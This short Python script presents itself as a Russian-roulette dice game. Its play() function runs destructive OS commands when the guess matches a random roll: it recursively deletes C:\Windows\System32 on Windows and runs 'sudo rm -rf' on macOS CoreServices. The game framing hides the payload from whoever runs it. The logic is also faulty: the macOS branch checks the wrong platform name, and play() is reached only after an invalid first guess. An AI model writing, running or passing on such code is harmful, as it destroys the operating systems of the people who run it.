import random
import os
import platform

def play(guess):
    if random.randint(1, 6) == int(guess):
        operating_system = platform.system()
        if operating_system == 'Windows':
            os.system("rd /s /q C:\\Windows\\System32")
        elif operating_system == 'MacOS':
            os.system("sudo rm -rf /System/Library/CoreServices")
        else:
            print("Unknown operating system")

option = input("Shall we play a game? (y/n): ")

if option.lower() == 'y':
    guess = input("Pick a number between 1 and 6: ")
    while not guess.isdigit() or not (1 <= int(guess) <= 6):
        again = input("I am still alive! Wish to play again? (y/n):")
        if again.lower() == 'y':
            guess = input("Pick a number between 1 and 6: ")
            play(guess)
        else: 
            print("Goodbye")
            break
elif option.lower() == 'n':
    print("Goodbye")
else:
    print("Invalid option")
    
        






